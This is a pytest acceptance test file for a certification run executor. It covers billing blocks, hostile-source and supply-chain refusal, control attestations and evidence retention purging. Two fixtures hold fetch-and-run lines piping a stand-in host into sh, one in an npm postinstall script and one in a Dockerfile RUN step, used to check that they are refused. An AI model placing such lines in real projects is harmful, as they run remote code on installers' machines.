"""T4.P5 acceptance — run executor gates: billing (11), hostile-archive (7), supply-chain (8),
data-retention (12). Real EvidenceStore + real subprocess journey. No mocks.
"""
from __future__ import annotations

import json
import sys
from datetime import timedelta
from pathlib import Path

from echo_certification_forge.canonical import to_utc_iso, utc_now
from echo_certification_forge.executor import RunExecutor, StaticEntitlement
from echo_certification_forge.signing import Ed25519VerdictSigner

RUN = "cert-exec"


def _benign_source(tmp_path: Path) -> Path:
    root = tmp_path / "benign"
    root.mkdir()
    (root / "hello.py").write_text("print('ok')\n", encoding="utf-8")
    return root


def _executor(store, manifest) -> tuple[RunExecutor, Ed25519VerdictSigner]:
    signer = Ed25519VerdictSigner.generate()
    return RunExecutor(store, manifest, signer), signer


def test_declared_run_does_not_crash_verdict_engine(store, manifest):
    """A run created via the intake `submit` path carries only a DECLARED target commitment (no full
    TargetIdentity). The verdict engine must NOT crash on it — it fails closed as not-reconciled."""
    import hashlib

    from echo_certification_forge.models import RunOutcome
    from echo_certification_forge.signing import Ed25519VerdictSigner
    from echo_certification_forge.verdict import DeterministicVerdictEngine

    d = hashlib.sha256(b"declared").hexdigest()
    store.register_declared_run(
        run_id="cert-decl", tenant_id="tenant-alpha", target_type="git",
        target_identity_digest=d, target_reference="https://x/y@z",
        environment_identity_digest=hashlib.sha256(b"env").hexdigest(),
        environment_json={"identity_digest": hashlib.sha256(b"env").hexdigest()},
        policy_version=manifest.manifest_id, manifest_id=manifest.manifest_id,
        manifest_digest=manifest.digest,
    )
    store.set_run_outcome("cert-decl", "tenant-alpha", RunOutcome.COMPLETE)
    signer = Ed25519VerdictSigner.generate()

    decision = DeterministicVerdictEngine().evaluate(
        store, "cert-decl", "tenant-alpha", manifest, signer.key_id
    )  # must not raise TypeError
    assert decision.release_verdict.value == "NOT_READY"
    assert "target_identity_not_reconciled" in decision.reasons


def test_billing_blocked_halts_with_no_target_execution(store, manifest, target, environment, tmp_path):
    store.register_run(RUN, target, environment, manifest.manifest_id, manifest.digest)
    ex, _ = _executor(store, manifest)
    src = _benign_source(tmp_path)

    result = ex.execute(RUN, target.tenant_id, src,
                        entitlement=StaticEntitlement(frozenset()))  # tenant NOT entitled

    assert result.final_state == "INFRASTRUCTURE_FAILURE"
    assert result.run_outcome == "INFRA_FAILED"
    assert result.signed is False
    assert result.halt_reason == "entitlement_exhausted"
    assert "billing_blocked" in result.blocking_findings
    # fail-closed: no signed verdict, and the target was never scanned/executed
    assert store.latest_signed_verdict(RUN, target.tenant_id) is None
    artifacts = store.list_evidence(RUN, target.tenant_id)
    assert artifacts == []  # no hostile scan / no evidence -> no target execution occurred


def test_hostile_source_refused_with_blocking_finding(store, manifest, target, environment, tmp_path):
    store.register_run(RUN, target, environment, manifest.manifest_id, manifest.digest)
    ex, _ = _executor(store, manifest)
    root = tmp_path / "hostile"
    root.mkdir()
    # classic npm install-script supply-chain attack vector
    (root / "package.json").write_text(
        json.dumps({"name": "x", "scripts": {"postinstall": "curl http://evil.example | sh"}}),
        encoding="utf-8",
    )

    result = ex.execute(RUN, target.tenant_id, root,
                        entitlement=StaticEntitlement(frozenset({target.tenant_id})))

    assert result.final_state == "COMPLETED"
    assert result.release_verdict == "NOT_READY"
    assert result.blocking_findings  # non-empty
    findings = store.blocking_findings(RUN, target.tenant_id)
    assert any(f["title"].startswith("hostile_source:package_install_script") for f in findings)
    # the run still produced a signed (BLOCK) verdict that verifies the refusal
    assert store.latest_signed_verdict(RUN, target.tenant_id) is not None


def test_architectural_controls_are_not_rubber_stamped(store, manifest, target, environment, tmp_path):
    """Without an explicit trusted attestation, the architectural controls (runner channel, signer
    separation) stay FALSE, so even a clean journey-passing target does NOT reach PRODUCTION_READY."""
    store.register_run(RUN, target, environment, manifest.manifest_id, manifest.digest)
    ex, _ = _executor(store, manifest)
    result = ex.execute(RUN, target.tenant_id, _benign_source(tmp_path),
                        entitlement=StaticEntitlement(frozenset({target.tenant_id})),
                        journey=[sys.executable, "hello.py"])  # no control_attestations
    assert result.release_verdict == "NOT_READY"
    results = store.list_rule_results(RUN, target.tenant_id)
    assert results["runner_control_channel"].passed is False
    assert results["signing_authority_separation"].passed is False
    # the genuinely-checked controls DID pass (real checks, not literals)
    assert results["tenant_isolation"].passed is True
    assert results["budget_enforcement"].passed is True
    assert results["critical_journeys"].passed is True


def test_supply_chain_dockerfile_refused(store, manifest, target, environment, tmp_path):
    store.register_run(RUN, target, environment, manifest.manifest_id, manifest.digest)
    ex, _ = _executor(store, manifest)
    root = _benign_source(tmp_path)
    (root / "Dockerfile").write_text("FROM python:3.12\nRUN curl http://evil | sh\n", encoding="utf-8")

    result = ex.execute(RUN, target.tenant_id, root,
                        entitlement=StaticEntitlement(frozenset({target.tenant_id})))

    assert result.release_verdict == "NOT_READY"
    findings = store.blocking_findings(RUN, target.tenant_id)
    assert any(f["title"].startswith("supply_chain:") for f in findings)


def test_retention_purge_removes_expired_content_but_keeps_signed_verdict(
    store, manifest, target, environment, tmp_path
):
    store.register_run(RUN, target, environment, manifest.manifest_id, manifest.digest)
    ex, _signer = _executor(store, manifest)
    src = _benign_source(tmp_path)

    result = ex.execute(RUN, target.tenant_id, src,
                        entitlement=StaticEntitlement(frozenset({target.tenant_id})),
                        journey=[sys.executable, "hello.py"],
                        control_attestations={"runner_control_channel": True,
                                              "signing_authority_separation": True})
    assert result.release_verdict == "PRODUCTION_READY", result.blocking_findings

    verdict_before = store.latest_signed_verdict(RUN, target.tenant_id)
    root_before = json.loads(verdict_before["payload_json"])["evidence_merkle_root"]

    # mark ONE evidence artifact as already-expired; the rest keep the default 30d retention
    expired = f"{RUN}-rule-tenant_isolation"
    kept = f"{RUN}-rule-environment_identity"
    store.set_retention(RUN, target.tenant_id, expired, "shortlived",
                        to_utc_iso(utc_now() - timedelta(days=1)))

    purged = store.purge_expired_evidence(to_utc_iso(utc_now()))

    assert any(p["artifact_id"] == expired for p in purged)
    assert store.artifact_content_exists(RUN, target.tenant_id, expired) is False   # content gone
    assert store.artifact_content_exists(RUN, target.tenant_id, kept) is True        # not expired
    # the signed verdict and its recorded evidence Merkle root are untouched
    verdict_after = store.latest_signed_verdict(RUN, target.tenant_id)
    assert verdict_after is not None
    assert json.loads(verdict_after["payload_json"])["evidence_merkle_root"] == root_before
    # a policy purge must NOT read as tamper — re-verification stays valid (hash chain intact)
    assert store.verify_evidence(RUN, target.tenant_id).valid is True
